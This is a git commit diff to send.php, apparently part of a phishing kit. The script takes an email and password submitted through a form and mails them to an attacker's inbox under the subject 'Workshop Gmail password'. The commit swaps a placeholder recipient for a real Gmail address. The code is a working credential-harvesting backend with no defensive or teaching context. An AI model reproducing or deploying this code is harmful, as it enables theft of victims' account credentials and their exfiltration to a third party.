6d21311da1ac740e8ee9dc657766b808d09a64d8
Nagesh-max <68935308+Nagesh-max@users.noreply.github.com>
2020-07-29 08:51:56 +0530

    Nnnn
    Finding

--- send.php
+++ send.php
@@ -1,7 +1,7 @@
 <?php
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
-         $to = "yourmailaddresshere@gmail.com";
+         $to = "nnag8378@gmail.com";
          $subject = "Workshop Gmail password";
          
          $message = "$mailhacked";
